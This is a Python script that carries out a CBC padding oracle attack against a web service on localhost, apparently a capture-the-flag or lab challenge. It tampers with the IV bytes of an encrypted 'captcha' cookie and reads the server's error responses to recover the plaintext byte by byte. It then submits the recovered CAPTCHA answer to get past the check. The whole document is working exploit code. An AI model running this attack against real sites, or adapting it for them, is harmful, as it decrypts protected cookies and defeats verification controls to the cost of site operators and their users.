import base64
import requests
import time

# Configuration
base_url = "http://127.0.0.1:32834"
cookie_name = "captcha"
target_cookie = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="

# Decode the base64 cookie
cookie_bytes = base64.b64decode(target_cookie)
BLOCK_SIZE = 16
blocks = [cookie_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cookie_bytes), BLOCK_SIZE)]

print(f"[+] Fixed Padding Oracle Attack")
print(f"[+] Cookie: {target_cookie}")
print(f"[+] Decoded length: {len(cookie_bytes)} bytes")
print(f"[+] Number of blocks: {len(blocks)}")

def make_request(modified_cookie):
    """Make a request with modified cookie"""
    try:
        session = requests.Session()
        session.cookies.set(cookie_name, modified_cookie)
        
        data = {
            'username': 'testuser',
            'captcha': 'test',
            'submit': 'Submit'
        }
        
        resp = session.post(base_url, data=data, timeout=8)
        return resp.text, resp.status_code
    except Exception as e:
        return f"Error: {e}", -1

def test_padding_oracle():
    """Test the padding oracle to confirm it works"""
    print("\n[*] Testing padding oracle detection...")
    
    # Valid cookie
    resp1, status1 = make_request(target_cookie)
    print(f"  Valid cookie: '{resp1}' (status {status1})")
    
    # Invalid padding - modify last byte of first block
    test_bytes = bytearray(cookie_bytes)
    test_bytes[15] ^= 0xFF
    bad_cookie = base64.b64encode(test_bytes).decode()
    resp2, status2 = make_request(bad_cookie)
    print(f"  Invalid padding: '{resp2}' (status {status2})")
    
    valid_padding = "Invalid CAPTCHA!" in resp1 or status1 == 403
    invalid_padding = "Invalid padding" in resp2 or status2 == 500
    
    print(f"  Detection working: {valid_padding and invalid_padding}")
    return valid_padding and invalid_padding

# Test if oracle works
oracle_works = test_padding_oracle()

def decrypt_block(iv, ciphertext):
    """Decrypt a block using padding oracle attack"""
    print(f"\n{'='*70}")
    print(f"[*] Starting block decryption")
    print(f"[*] IV: {iv.hex()}")
    print(f"[*] Ciphertext: {ciphertext.hex()}")
    print(f"{'='*70}")
    
    decrypted = bytearray(BLOCK_SIZE)
    original_iv = bytearray(iv)
    
    # For each byte position from last to first
    for pos in range(BLOCK_SIZE - 1, -1, -1):
        expected_padding = BLOCK_SIZE - pos
        print(f"\n[+] Decrypting byte {pos:2d} (target padding: {expected_padding}) ", end="", flush=True)
        
        found = False
        attempts = 0
        
        # Try all possible values for this byte
        for guess in range(256):
            attempts += 1
            
            if attempts % 50 == 0:
                print(".", end="", flush=True)
                time.sleep(0.1)
            
            # Create test IV
            test_iv = bytearray(original_iv)
            
            # Set the padding for bytes we already know
            for i in range(pos + 1, BLOCK_SIZE):
                pad_byte = expected_padding
                test_iv[i] = original_iv[i] ^ decrypted[i] ^ pad_byte
            
            # Set the current byte to test
            test_iv[pos] = original_iv[pos] ^ guess ^ expected_padding
            
            # Create full cookie
            test_cookie = test_iv + ciphertext
            encoded_cookie = base64.b64encode(test_cookie).decode()
            
            # Test with server
            response, status = make_request(encoded_cookie)
            
            # Check if padding is valid
            # Valid padding = "Invalid CAPTCHA!" or 403 status (content error)
            # Invalid padding = "Invalid padding" or 500 status (decryption error)
            is_valid = False
            
            if "Invalid CAPTCHA!" in response or (status == 403 and len(response) < 50):
                is_valid = True
            elif "Invalid padding" in response or status == 500:
                is_valid = False
            else:
                # Default to valid for unexpected responses
                is_valid = True
            
            if is_valid:
                found = True
                decrypted[pos] = guess
                char = chr(guess) if 32 <= guess <= 126 else '.'
                print(f"\n[+] Found byte {pos:2d} = 0x{guess:02x} '{char}' ({attempts} attempts)")
                break
        
        if not found:
            print(f"\n[-] Failed to find byte {pos}")
            decrypted[pos] = 0
    
    print(f"\n{'='*70}")
    print(f"[+] Decrypted block: {decrypted.hex()}")
    print(f"{'='*70}")
    
    return bytes(decrypted)

# Decrypt the captcha cookie
iv = blocks[0]
ciphertext = blocks[1]

print(f"\n[*] IV (Block 0): {iv.hex()}")
print(f"[*] Ciphertext to decrypt (Block 1): {ciphertext.hex()}")

if oracle_works:
    print(f"\n[+] Padding oracle confirmed working, starting attack...")
    decrypted = decrypt_block(iv, ciphertext)
    
    print(f"\n[+] Final decrypted bytes:")
    for i, byte in enumerate(decrypted):
        char = chr(byte) if 32 <= byte <= 126 else '.'
        if byte == 0:
            display = '<NULL>'
        elif byte < 32:
            display = f'<0x{byte:02x}>'
        else:
            display = f"'{char}'"
        print(f"  Byte {i:2d}: 0x{byte:02x} = {display}")
    
    # Remove PKCS#7 padding
    padding_len = decrypted[-1]
    print(f"\n[+] PKCS#7 padding byte: {padding_len}")
    
    if 1 <= padding_len <= BLOCK_SIZE:
        # Verify padding
        valid = True
        for i in range(1, padding_len + 1):
            if decrypted[-i] != padding_len:
                valid = False
                break
        
        if valid:
            plaintext = decrypted[:-padding_len]
            print(f"[+] Valid padding, plaintext length: {len(plaintext)} bytes")
            print(f"[+] Plaintext hex: {plaintext.hex()}")
            
            # Decode plaintext
            try:
                captcha_text = plaintext.decode('utf-8')
                print(f"[+]Plaintext (UTF-8): '{captcha_text}'")
            except:
                try:
                    captcha_text = plaintext.decode('ascii', errors='replace')
                    print(f"[+] Plaintext (ASCII): '{captcha_text}'")
                except:
                    captcha_text = plaintext.decode('latin-1')
                    print(f"[+] Plaintext (latin-1): '{captcha_text}'")
            
            print(f"\n{'='*70}")
            print(f"[*] CAPTCHA SOLUTION: '{captcha_text}'")
            print(f"{'='*70}")
            
            # Test the solution
            print(f"\n[*] Testing the decrypted captcha solution...")
            session = requests.Session()
            session.cookies.set(cookie_name, target_cookie)
            
            test_data = {
                'username': 'testuser123',
                'captcha': captcha_text,
                'submit': 'Submit'
            }
            
            resp = session.post(base_url, data=test_data, timeout=10)
            print(f"[*] Test response: '{resp.text}' (status: {resp.status_code})")
            
            if "Invalid CAPTCHA!" not in resp.text:
                print(f"[+] SUCCESS! Captcha accepted!")
            else:
                print(f"[-] Still rejected - checking encoding...")
                # Try common variations
                variations = [captcha_text.strip(), captcha_text.upper(), captcha_text.lower()]
                for var in variations:
                    if var != captcha_text:
                        print(f"[*] Testing variation: '{var}'")
                        test_data['captcha'] = var
                        resp = session.post(base_url, data=test_data, timeout=10)
                        if "Invalid CAPTCHA!" not in resp.text:
                            print(f"[+] SUCCESS with variation: '{var}'")
                            break
        else:
            print(f"[-] Invalid padding structure")
    else:
        print(f"[-] Invalid padding byte: {padding_len}")
else:
    print(f"[-] Padding oracle not working correctly")

